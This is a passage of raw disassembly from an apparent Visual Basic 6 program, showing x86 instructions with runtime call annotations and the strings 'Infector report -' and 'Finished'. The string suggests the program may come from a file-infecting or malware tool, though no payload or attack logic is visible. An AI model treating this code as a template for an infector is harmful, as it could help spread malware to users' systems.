0086CF6A: push var_00000480
0086CF70: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086CF75: mov var_00000518, eax
0086CF7B: jmp 86CF84h
0086CF7D: and var_00000518, 00000000h
0086CF84: lea eax, var_60
0086CF87: push eax
0086CF88: lea eax, var_5C
0086CF8B: push eax
0086CF8C: push 00000002h
0086CF8E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086CF93: add esp, 0000000Ch
0086CF96: lea eax, var_000000CC
0086CF9C: push eax
0086CF9D: lea eax, var_000000C8
0086CFA3: push eax
0086CFA4: lea eax, var_000000C4
0086CFAA: push eax
0086CFAB: push 00000003h
0086CFAD: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086CFB2: add esp, 00000010h
0086CFB5: lea eax, var_0000015C
0086CFBB: push eax
0086CFBC: lea eax, var_0000014C
0086CFC2: push eax
0086CFC3: lea eax, var_0000013C
0086CFC9: push eax
0086CFCA: push 00000003h
0086CFCC: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086CFD1: add esp, 00000010h
0086CFD4: mov var_04, 0000000Ch
0086CFDB: cmp [008F2734h], 00000000h
0086CFE2: jnz 86CFFFh
0086CFE4: push 008F2734h
0086CFE9: push 00413A84h
0086CFEE: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086CFF3: mov var_0000051C, 008F2734h
0086CFFD: jmp 86D009h
0086CFFF: mov var_0000051C, 008F2734h
0086D009: mov eax, var_0000051C
0086D00F: mov eax, [eax]
0086D011: mov var_0000047C, eax
0086D017: mov var_00000308, 00000003h
0086D021: mov var_00000310, 00000003h
0086D02B: mov eax, var_48
0086D02E: mov var_000002E8, eax
0086D034: mov var_000002F0, 00000003h
0086D03E: mov var_00000348, 00000004h
0086D048: mov var_00000350, 00000003h
0086D052: mov eax, var_48
0086D055: mov var_00000328, eax
0086D05B: mov var_00000330, 00000003h
0086D065: push 00456ED0h ; Infector report -
0086D06A: push 00000010h
0086D06C: pop eax
0086D06D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D072: lea esi, var_00000310
0086D078: mov edi, esp
0086D07A: movsd 
0086D07B: movsd 
0086D07C: movsd 
0086D07D: movsd 
0086D07E: push 00000001h
0086D080: push 00000010h
0086D082: push 00440E58h
0086D087: push 00000010h
0086D089: pop eax
0086D08A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D08F: lea esi, var_000002F0
0086D095: mov edi, esp
0086D097: movsd 
0086D098: movsd 
0086D099: movsd 
0086D09A: movsd 
0086D09B: push 00000001h
0086D09D: push 00000000h
0086D09F: push 00440E48h
0086D0A4: push 00000000h
0086D0A6: push 00000018h
0086D0A8: mov eax, [ebp+08h]
0086D0AB: mov eax, [eax]
0086D0AD: push [ebp+08h]
0086D0B0: call [eax+00000320h]
0086D0B6: push eax
0086D0B7: lea eax, var_000000C4
0086D0BD: push eax
0086D0BE: call 00410A84h ; Set (object)
0086D0C3: push eax
0086D0C4: lea eax, var_0000013C
0086D0CA: push eax
0086D0CB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D0D0: add esp, 00000010h
0086D0D3: push eax
0086D0D4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D0D9: push eax
0086D0DA: lea eax, var_000000C8
0086D0E0: push eax
0086D0E1: call 00410A84h ; Set (object)
0086D0E6: push eax
0086D0E7: lea eax, var_0000014C
0086D0ED: push eax
0086D0EE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D0F3: add esp, 00000020h
0086D0F6: push eax
0086D0F7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D0FC: push eax
0086D0FD: lea eax, var_000000CC
0086D103: push eax
0086D104: call 00410A84h ; Set (object)
0086D109: push eax
0086D10A: lea eax, var_0000015C
0086D110: push eax
0086D111: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D116: add esp, 00000020h
0086D119: push eax
0086D11A: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086D11F: mov edx, eax
0086D121: lea ecx, var_5C
0086D124: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086D129: push eax
0086D12A: call 00410A18h ; &
0086D12F: mov edx, eax
0086D131: lea ecx, var_60
0086D134: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086D139: push eax
0086D13A: push 00441740h
0086D13F: call 00410A18h ; &
0086D144: mov edx, eax
0086D146: lea ecx, var_64
0086D149: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086D14E: push eax
0086D14F: push 00000010h
0086D151: pop eax
0086D152: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D157: lea esi, var_00000350
0086D15D: mov edi, esp
0086D15F: movsd 
0086D160: movsd 
0086D161: movsd 
0086D162: movsd 
0086D163: push 00000001h
0086D165: push 00000010h
0086D167: push 00440E58h
0086D16C: push 00000010h
0086D16E: pop eax
0086D16F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D174: lea esi, var_00000330
0086D17A: mov edi, esp
0086D17C: movsd 
0086D17D: movsd 
0086D17E: movsd 
0086D17F: movsd 
0086D180: push 00000001h
0086D182: push 00000000h
0086D184: push 00440E48h
0086D189: push 00000000h
0086D18B: push 00000018h
0086D18D: mov eax, [ebp+08h]
0086D190: mov eax, [eax]
0086D192: push [ebp+08h]
0086D195: call [eax+00000320h]
0086D19B: push eax
0086D19C: lea eax, var_000000D0
0086D1A2: push eax
0086D1A3: call 00410A84h ; Set (object)
0086D1A8: push eax
0086D1A9: lea eax, var_0000016C
0086D1AF: push eax
0086D1B0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D1B5: add esp, 00000010h
0086D1B8: push eax
0086D1B9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D1BE: push eax
0086D1BF: lea eax, var_000000D4
0086D1C5: push eax
0086D1C6: call 00410A84h ; Set (object)
0086D1CB: push eax
0086D1CC: lea eax, var_0000017C
0086D1D2: push eax
0086D1D3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D1D8: add esp, 00000020h
0086D1DB: push eax
0086D1DC: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D1E1: push eax
0086D1E2: lea eax, var_000000D8
0086D1E8: push eax
0086D1E9: call 00410A84h ; Set (object)
0086D1EE: push eax
0086D1EF: lea eax, var_0000018C
0086D1F5: push eax
0086D1F6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D1FB: add esp, 00000020h
0086D1FE: push eax
0086D1FF: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086D204: mov edx, eax
0086D206: lea ecx, var_68
0086D209: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086D20E: push eax
0086D20F: call 00410A18h ; &
0086D214: mov edx, eax
0086D216: lea ecx, var_6C
0086D219: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086D21E: push eax
0086D21F: mov eax, var_0000047C
0086D225: mov eax, [eax]
0086D227: push var_0000047C
0086D22D: call [eax+54h]
0086D230: fclex 
0086D232: mov var_00000480, eax
0086D238: cmp var_00000480, 00000000h
0086D23F: jnl 86D261h
0086D241: push 00000054h
0086D243: push 00444A54h
0086D248: push var_0000047C
0086D24E: push var_00000480
0086D254: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086D259: mov var_00000520, eax
0086D25F: jmp 86D268h
0086D261: and var_00000520, 00000000h
0086D268: lea eax, var_6C
0086D26B: push eax
0086D26C: lea eax, var_68
0086D26F: push eax
0086D270: lea eax, var_64
0086D273: push eax
0086D274: lea eax, var_60
0086D277: push eax
0086D278: lea eax, var_5C
0086D27B: push eax
0086D27C: push 00000005h
0086D27E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086D283: add esp, 00000018h
0086D286: lea eax, var_000000D8
0086D28C: push eax
0086D28D: lea eax, var_000000D4
0086D293: push eax
0086D294: lea eax, var_000000D0
0086D29A: push eax
0086D29B: lea eax, var_000000CC
0086D2A1: push eax
0086D2A2: lea eax, var_000000C8
0086D2A8: push eax
0086D2A9: lea eax, var_000000C4
0086D2AF: push eax
0086D2B0: push 00000006h
0086D2B2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086D2B7: add esp, 0000001Ch
0086D2BA: lea eax, var_0000018C
0086D2C0: push eax
0086D2C1: lea eax, var_0000017C
0086D2C7: push eax
0086D2C8: lea eax, var_0000016C
0086D2CE: push eax
0086D2CF: lea eax, var_0000015C
0086D2D5: push eax
0086D2D6: lea eax, var_0000014C
0086D2DC: push eax
0086D2DD: lea eax, var_0000013C
0086D2E3: push eax
0086D2E4: push 00000006h
0086D2E6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086D2EB: add esp, 0000001Ch
0086D2EE: mov var_04, 0000000Dh
0086D2F5: cmp [008F2734h], 00000000h
0086D2FC: jnz 86D319h
0086D2FE: push 008F2734h
0086D303: push 00413A84h
0086D308: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086D30D: mov var_00000524, 008F2734h
0086D317: jmp 86D323h
0086D319: mov var_00000524, 008F2734h
0086D323: mov eax, var_00000524
0086D329: mov eax, [eax]
0086D32B: mov var_0000047C, eax
0086D331: mov var_000002F8, 80020004h
0086D33B: mov var_00000300, 0000000Ah
0086D345: mov var_000002E8, 80020004h
0086D34F: mov var_000002F0, 0000000Ah
0086D359: push 00000010h
0086D35B: pop eax
0086D35C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D361: lea esi, var_00000300
0086D367: mov edi, esp
0086D369: movsd 
0086D36A: movsd 
0086D36B: movsd 
0086D36C: movsd 
0086D36D: push 00000010h
0086D36F: pop eax
0086D370: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D375: lea esi, var_000002F0
0086D37B: mov edi, esp
0086D37D: movsd 
0086D37E: movsd 
0086D37F: movsd 
0086D380: movsd 
0086D381: mov eax, var_0000047C
0086D387: mov eax, [eax]
0086D389: push var_0000047C
0086D38F: call [eax+000002B0h]
0086D395: fclex 
0086D397: mov var_00000480, eax
0086D39D: cmp var_00000480, 00000000h
0086D3A4: jnl 86D3C9h
0086D3A6: push 000002B0h
0086D3AB: push 00444A54h
0086D3B0: push var_0000047C
0086D3B6: push var_00000480
0086D3BC: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0086D3C1: mov var_00000528, eax
0086D3C7: jmp 86D3D0h
0086D3C9: and var_00000528, 00000000h
0086D3D0: mov var_04, 0000000Eh
0086D3D7: mov eax, var_48
0086D3DA: mov var_000002E8, eax
0086D3E0: mov var_000002F0, 00000003h
0086D3EA: push 00000000h
0086D3EC: push 00000014h
0086D3EE: push 00440E58h
0086D3F3: push 00000010h
0086D3F5: pop eax
0086D3F6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D3FB: lea esi, var_000002F0
0086D401: mov edi, esp
0086D403: movsd 
0086D404: movsd 
0086D405: movsd 
0086D406: movsd 
0086D407: push 00000001h
0086D409: push 00000000h
0086D40B: push 00440E48h
0086D410: push 00000000h
0086D412: push 00000018h
0086D414: mov eax, [ebp+08h]
0086D417: mov eax, [eax]
0086D419: push [ebp+08h]
0086D41C: call [eax+00000320h]
0086D422: push eax
0086D423: lea eax, var_000000C4
0086D429: push eax
0086D42A: call 00410A84h ; Set (object)
0086D42F: push eax
0086D430: lea eax, var_0000013C
0086D436: push eax
0086D437: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D43C: add esp, 00000010h
0086D43F: push eax
0086D440: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D445: push eax
0086D446: lea eax, var_000000C8
0086D44C: push eax
0086D44D: call 00410A84h ; Set (object)
0086D452: push eax
0086D453: lea eax, var_0000014C
0086D459: push eax
0086D45A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D45F: add esp, 00000020h
0086D462: push eax
0086D463: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D468: push eax
0086D469: lea eax, var_000000CC
0086D46F: push eax
0086D470: call 00410A84h ; Set (object)
0086D475: push eax
0086D476: lea eax, var_0000015C
0086D47C: push eax
0086D47D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D482: add esp, 00000010h
0086D485: push eax
0086D486: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086D48B: mov edx, eax
0086D48D: lea ecx, var_5C
0086D490: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086D495: push eax
0086D496: call 004109DCh ; Val(arg_1)
0086D49B: fstp real8 ptr var_00000478
0086D4A1: push 00000000h
0086D4A3: push 00000000h
0086D4A5: push 00000001h
0086D4A7: push 00000000h
0086D4A9: lea eax, var_000002E0
0086D4AF: push eax
0086D4B0: push 00000010h
0086D4B2: push 00000880h
0086D4B7: call 00410946h ; ReDim
0086D4BC: add esp, 0000001Ch
0086D4BF: mov var_00000308, 00442938h
0086D4C9: mov var_00000310, 00000008h
0086D4D3: lea esi, var_00000310
0086D4D9: push 00000000h
0086D4DB: push var_000002E0
0086D4E1: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0086D4E6: mov ecx, eax
0086D4E8: mov edx, esi
0086D4EA: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0086D4EF: mov edx, 0043D7D4h ; x80
0086D4F4: lea ecx, var_60
0086D4F7: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0086D4FC: lea eax, var_000002E0
0086D502: push eax
0086D503: lea eax, var_60
0086D506: push eax
0086D507: fld real8 ptr var_00000478
0086D50D: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0086D512: push eax
0086D513: call 007A6910h
0086D518: lea eax, var_000002E0
0086D51E: push eax
0086D51F: push 00000000h
0086D521: call 00410934h ; Erase
0086D526: lea eax, var_60
0086D529: push eax
0086D52A: lea eax, var_5C
0086D52D: push eax
0086D52E: push 00000002h
0086D530: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086D535: add esp, 0000000Ch
0086D538: lea eax, var_000000CC
0086D53E: push eax
0086D53F: lea eax, var_000000C8
0086D545: push eax
0086D546: lea eax, var_000000C4
0086D54C: push eax
0086D54D: push 00000003h
0086D54F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086D554: add esp, 00000010h
0086D557: lea eax, var_0000015C
0086D55D: push eax
0086D55E: lea eax, var_0000014C
0086D564: push eax
0086D565: lea eax, var_0000013C
0086D56B: push eax
0086D56C: push 00000003h
0086D56E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086D573: add esp, 00000010h
0086D576: jmp 0086F85Ah
0086D57B: mov var_04, 00000012h
0086D582: mov var_000002E8, 00000001h
0086D58C: mov var_000002F0, 00000002h
0086D596: push 00000000h
0086D598: push 00000001h
0086D59A: push 00440E48h
0086D59F: push 00000000h
0086D5A1: push 00000018h
0086D5A3: mov eax, [ebp+08h]
0086D5A6: mov eax, [eax]
0086D5A8: push [ebp+08h]
0086D5AB: call [eax+00000320h]
0086D5B1: push eax
0086D5B2: lea eax, var_000000C4
0086D5B8: push eax
0086D5B9: call 00410A84h ; Set (object)
0086D5BE: push eax
0086D5BF: lea eax, var_0000013C
0086D5C5: push eax
0086D5C6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D5CB: add esp, 00000010h
0086D5CE: push eax
0086D5CF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D5D4: push eax
0086D5D5: lea eax, var_000000C8
0086D5DB: push eax
0086D5DC: call 00410A84h ; Set (object)
0086D5E1: push eax
0086D5E2: lea eax, var_0000014C
0086D5E8: push eax
0086D5E9: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D5EE: add esp, 00000010h
0086D5F1: push eax
0086D5F2: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086D5F7: mov var_000002F8, eax
0086D5FD: mov var_00000300, 00000003h
0086D607: mov var_00000308, 00000001h
0086D611: mov var_00000310, 00000002h
0086D61B: lea eax, var_000002F0
0086D621: push eax
0086D622: lea eax, var_00000300
0086D628: push eax
0086D629: lea eax, var_00000310
0086D62F: push eax
0086D630: lea eax, var_000004A8
0086D636: push eax
0086D637: lea eax, var_00000498
0086D63D: push eax
0086D63E: lea eax, var_30
0086D641: push eax
0086D642: call 00410A3Ch ; For
0086D647: mov var_00000504, eax
0086D64D: lea eax, var_000000C8
0086D653: push eax
0086D654: lea eax, var_000000C4
0086D65A: push eax
0086D65B: push 00000002h
0086D65D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086D662: add esp, 0000000Ch
0086D665: lea eax, var_0000014C
0086D66B: push eax
0086D66C: lea eax, var_0000013C
0086D672: push eax
0086D673: push 00000002h
0086D675: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086D67A: add esp, 0000000Ch
0086D67D: jmp 0086D8ABh
0086D682: mov var_04, 00000013h
0086D689: mov var_000002F8, 00000007h
0086D693: mov var_00000300, 00000003h
0086D69D: lea eax, var_30
0086D6A0: mov var_000002E8, eax
0086D6A6: mov var_000002F0, 0000400Ch
0086D6B0: push 00000010h
0086D6B2: pop eax
0086D6B3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D6B8: lea esi, var_00000300
0086D6BE: mov edi, esp
0086D6C0: movsd 
0086D6C1: movsd 
0086D6C2: movsd 
0086D6C3: movsd 
0086D6C4: push 00000001h
0086D6C6: push 00000010h
0086D6C8: push 00440E58h
0086D6CD: push 00000010h
0086D6CF: pop eax
0086D6D0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D6D5: lea esi, var_000002F0
0086D6DB: mov edi, esp
0086D6DD: movsd 
0086D6DE: movsd 
0086D6DF: movsd 
0086D6E0: movsd 
0086D6E1: push 00000001h
0086D6E3: push 00000000h
0086D6E5: push 00440E48h
0086D6EA: push 00000000h
0086D6EC: push 00000018h
0086D6EE: mov eax, [ebp+08h]
0086D6F1: mov eax, [eax]
0086D6F3: push [ebp+08h]
0086D6F6: call [eax+00000320h]
0086D6FC: push eax
0086D6FD: lea eax, var_000000C4
0086D703: push eax
0086D704: call 00410A84h ; Set (object)
0086D709: push eax
0086D70A: lea eax, var_0000013C
0086D710: push eax
0086D711: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D716: add esp, 00000010h
0086D719: push eax
0086D71A: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D71F: push eax
0086D720: lea eax, var_000000C8
0086D726: push eax
0086D727: call 00410A84h ; Set (object)
0086D72C: push eax
0086D72D: lea eax, var_0000014C
0086D733: push eax
0086D734: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D739: add esp, 00000020h
0086D73C: push eax
0086D73D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D742: push eax
0086D743: lea eax, var_000000CC
0086D749: push eax
0086D74A: call 00410A84h ; Set (object)
0086D74F: push eax
0086D750: lea eax, var_0000015C
0086D756: push eax
0086D757: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D75C: add esp, 00000020h
0086D75F: push eax
0086D760: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086D765: mov edx, eax
0086D767: lea ecx, var_5C
0086D76A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086D76F: push eax
0086D770: push 004495B8h ; Finished
0086D775: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0086D77A: neg eax
0086D77C: sbb eax, eax
0086D77E: inc eax
0086D77F: neg eax
0086D781: mov var_0000047C, ax
0086D788: lea ecx, var_5C
0086D78B: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
0086D790: lea eax, var_000000CC
0086D796: push eax
0086D797: lea eax, var_000000C8
0086D79D: push eax
0086D79E: lea eax, var_000000C4
0086D7A4: push eax
0086D7A5: push 00000003h
0086D7A7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086D7AC: add esp, 00000010h
0086D7AF: lea eax, var_0000015C
0086D7B5: push eax
0086D7B6: lea eax, var_0000014C
0086D7BC: push eax
0086D7BD: lea eax, var_0000013C
0086D7C3: push eax
0086D7C4: push 00000003h
0086D7C6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086D7CB: add esp, 00000010h
0086D7CE: movsx eax, word ptr var_0000047C
0086D7D5: test eax, eax
0086D7D7: jz 0086D887h
0086D7DD: mov var_04, 00000014h
0086D7E4: lea eax, var_30
0086D7E7: mov var_000002E8, eax
0086D7ED: mov var_000002F0, 0000400Ch
0086D7F7: push 00000010h
0086D7F9: pop eax
0086D7FA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D7FF: lea esi, var_000002F0
0086D805: mov edi, esp
0086D807: movsd 
0086D808: movsd 
0086D809: movsd 
0086D80A: movsd 
0086D80B: push 00000001h
0086D80D: push 00000004h
0086D80F: push 00440E48h
0086D814: push 00000000h
0086D816: push 00000018h
0086D818: mov eax, [ebp+08h]
0086D81B: mov eax, [eax]
0086D81D: push [ebp+08h]
0086D820: call [eax+00000320h]
0086D826: push eax
0086D827: lea eax, var_000000C4
0086D82D: push eax
0086D82E: call 00410A84h ; Set (object)
0086D833: push eax
0086D834: lea eax, var_0000013C
0086D83A: push eax
0086D83B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D840: add esp, 00000010h
0086D843: push eax
0086D844: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D849: push eax
0086D84A: lea eax, var_000000C8
0086D850: push eax
0086D851: call 00410A84h ; Set (object)
0086D856: push eax
0086D857: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0086D85C: add esp, 0000001Ch
0086D85F: lea eax, var_000000C8
0086D865: push eax
0086D866: lea eax, var_000000C4
0086D86C: push eax
0086D86D: push 00000002h
0086D86F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086D874: add esp, 0000000Ch
0086D877: lea ecx, var_0000013C
0086D87D: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0086D882: jmp 0086D57Bh
0086D887: mov var_04, 00000017h
0086D88E: lea eax, var_000004A8
0086D894: push eax
0086D895: lea eax, var_00000498
0086D89B: push eax
0086D89C: lea eax, var_30
0086D89F: push eax
0086D8A0: call 00410A36h ; Next
0086D8A5: mov var_00000504, eax
0086D8AB: cmp var_00000504, 00000000h
0086D8B2: jnz 0086D682h
0086D8B8: jmp 0086F85Ah
0086D8BD: mov var_04, 00000019h
0086D8C4: mov var_000002E8, 00000001h
0086D8CE: mov var_000002F0, 00000002h
0086D8D8: push 00000000h
0086D8DA: push 00000001h
0086D8DC: push 00440E48h
0086D8E1: push 00000000h
0086D8E3: push 00000018h
0086D8E5: mov eax, [ebp+08h]
0086D8E8: mov eax, [eax]
0086D8EA: push [ebp+08h]
0086D8ED: call [eax+00000320h]
0086D8F3: push eax
0086D8F4: lea eax, var_000000C4
0086D8FA: push eax
0086D8FB: call 00410A84h ; Set (object)
0086D900: push eax
0086D901: lea eax, var_0000013C
0086D907: push eax
0086D908: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D90D: add esp, 00000010h
0086D910: push eax
0086D911: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086D916: push eax
0086D917: lea eax, var_000000C8
0086D91D: push eax
0086D91E: call 00410A84h ; Set (object)
0086D923: push eax
0086D924: lea eax, var_0000014C
0086D92A: push eax
0086D92B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086D930: add esp, 00000010h
0086D933: push eax
0086D934: call 00410A90h ; msvbvm60.dll.__vbaI4Var
0086D939: mov var_000002F8, eax
0086D93F: mov var_00000300, 00000003h
0086D949: mov var_00000308, 00000001h
0086D953: mov var_00000310, 00000002h
0086D95D: lea eax, var_000002F0
0086D963: push eax
0086D964: lea eax, var_00000300
0086D96A: push eax
0086D96B: lea eax, var_00000310
0086D971: push eax
0086D972: lea eax, var_000004C8
0086D978: push eax
0086D979: lea eax, var_000004B8
0086D97F: push eax
0086D980: lea eax, var_30
0086D983: push eax
0086D984: call 00410A3Ch ; For
0086D989: mov var_00000508, eax
0086D98F: lea eax, var_000000C8
0086D995: push eax
0086D996: lea eax, var_000000C4
0086D99C: push eax
0086D99D: push 00000002h
0086D99F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086D9A4: add esp, 0000000Ch
0086D9A7: lea eax, var_0000014C
0086D9AD: push eax
0086D9AE: lea eax, var_0000013C
0086D9B4: push eax
0086D9B5: push 00000002h
0086D9B7: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086D9BC: add esp, 0000000Ch
0086D9BF: jmp 0086E6B0h
0086D9C4: mov var_04, 0000001Ah
0086D9CB: lea eax, var_30
0086D9CE: mov var_000002E8, eax
0086D9D4: mov var_000002F0, 0000400Ch
0086D9DE: push 00000000h
0086D9E0: push 00000004h
0086D9E2: push 00440E58h
0086D9E7: push 00000010h
0086D9E9: pop eax
0086D9EA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086D9EF: lea esi, var_000002F0
0086D9F5: mov edi, esp
0086D9F7: movsd 
0086D9F8: movsd 
0086D9F9: movsd 
0086D9FA: movsd 
0086D9FB: push 00000001h
0086D9FD: push 00000000h
0086D9FF: push 00440E48h
0086DA04: push 00000000h
0086DA06: push 00000018h
0086DA08: mov eax, [ebp+08h]
0086DA0B: mov eax, [eax]
0086DA0D: push [ebp+08h]
0086DA10: call [eax+00000320h]
0086DA16: push eax
0086DA17: lea eax, var_000000C4
0086DA1D: push eax
0086DA1E: call 00410A84h ; Set (object)
0086DA23: push eax
0086DA24: lea eax, var_0000013C
0086DA2A: push eax
0086DA2B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DA30: add esp, 00000010h
0086DA33: push eax
0086DA34: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DA39: push eax
0086DA3A: lea eax, var_000000C8
0086DA40: push eax
0086DA41: call 00410A84h ; Set (object)
0086DA46: push eax
0086DA47: lea eax, var_0000014C
0086DA4D: push eax
0086DA4E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DA53: add esp, 00000020h
0086DA56: push eax
0086DA57: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086DA5C: push eax
0086DA5D: lea eax, var_000000CC
0086DA63: push eax
0086DA64: call 00410A84h ; Set (object)
0086DA69: push eax
0086DA6A: lea eax, var_0000015C
0086DA70: push eax
0086DA71: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086DA76: add esp, 00000010h
0086DA79: push eax
0086DA7A: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0086DA7F: sub ax, FFFFh
0086DA83: neg ax
0086DA86: sbb eax, eax
0086DA88: inc eax
0086DA89: neg eax
0086DA8B: mov var_0000047C, ax
0086DA92: lea eax, var_000000CC
0086DA98: push eax
0086DA99: lea eax, var_000000C8
0086DA9F: push eax
0086DAA0: lea eax, var_000000C4
0086DAA6: push eax
0086DAA7: push 00000003h
0086DAA9: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086DAAE: add esp, 00000010h
0086DAB1: lea eax, var_0000015C
0086DAB7: push eax
0086DAB8: lea eax, var_0000014C
0086DABE: push eax
0086DABF: lea eax, var_0000013C
0086DAC5: push eax
0086DAC6: push 00000003h
0086DAC8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086DACD: add esp, 00000010h
0086DAD0: movsx eax, word ptr var_0000047C
0086DAD7: test eax, eax
0086DAD9: jz 0086E68Ch
0086DADF: mov var_04, 0000001Bh
0086DAE6: lea eax, var_30
0086DAE9: mov var_000002E8, eax
0086DAEF: mov var_000002F0, 0000400Ch
0086DAF9: mov var_00000308, 00000001h
0086DB03: mov var_00000310, 00000003h
0086DB0D: lea eax, var_30
0086DB10: mov var_000002F8, eax
0086DB16: mov var_00000300, 0000400Ch
0086DB20: mov var_00000338, 00000002h
0086DB2A: mov var_00000340, 00000003h
0086DB34: lea eax, var_30
0086DB37: mov var_00000328, eax
0086DB3D: mov var_00000330, 0000400Ch
0086DB47: mov var_00000368, 00000003h
0086DB51: mov var_00000370, 00000003h
0086DB5B: lea eax, var_30
0086DB5E: mov var_00000358, eax
0086DB64: mov var_00000360, 0000400Ch
0086DB6E: mov var_00000398, 00000004h
0086DB78: mov var_000003A0, 00000003h
0086DB82: lea eax, var_30
0086DB85: mov var_00000388, eax
0086DB8B: mov var_00000390, 0000400Ch
0086DB95: mov var_000003C8, 00000005h
0086DB9F: mov var_000003D0, 00000003h
0086DBA9: lea eax, var_30
0086DBAC: mov var_000003B8, eax
0086DBB2: mov var_000003C0, 0000400Ch
0086DBBC: mov var_000003F8, 00000006h
0086DBC6: mov var_00000400, 00000003h
0086DBD0: lea eax, var_30
0086DBD3: mov var_000003E8, eax
0086DBD9: mov var_000003F0, 0000400Ch
0086DBE3: mov var_00000428, 00000007h
0086DBED: mov var_00000430, 00000003h
0086DBF7: lea eax, var_30
0086DBFA: mov var_00000418, eax
0086DC00: mov var_00000420, 0000400Ch
0086DC0A: mov var_00000458, 00000008h
0086DC14: mov var_00000460, 00000003h
0086DC1E: lea eax, var_30
0086DC21: mov var_00000448, eax
0086DC27: mov var_00000450, 0000400Ch
0086DC31: push var_44
0086DC34: push 00000000h
0086DC36: push 00000000h
0086DC38: push 00440E58h
0086DC3D: push 00000010h
0086DC3F: pop eax
0086DC40: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086DC45: lea esi, var_000002F0
0086DC4B: mov edi, esp
0086DC4D: movsd 
0086DC4E: movsd 
0086DC4F: movsd 
0086DC50: movsd 
